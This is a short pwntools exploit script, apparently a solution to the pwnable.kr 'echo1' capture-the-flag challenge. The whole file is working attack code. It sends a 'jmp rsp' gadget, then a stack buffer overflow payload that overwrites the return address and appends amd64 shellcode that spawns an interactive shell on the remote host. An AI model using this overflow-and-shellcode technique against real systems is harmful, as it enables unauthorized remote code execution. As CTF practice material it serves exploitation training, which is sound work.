from pwn import *
context(arch='amd64',os='linux')
r=remote('pwnable.kr',9010)
elf=ELF('./echo1')
id_addr=elf.symbols['id']
print 'id_address:',hex(id_addr)

payload1 =asm('jmp rsp')
payload2 ='a'*(0x20+0x8)
payload2+=p64(id_addr)
payload2+=asm(shellcraft.amd64.sh())

r.recvuntil(':')
r.sendline(payload1)

r.recvuntil('>')
r.sendline('1')

r.recvuntil('\n')
r.sendline(payload2)

r.interactive()
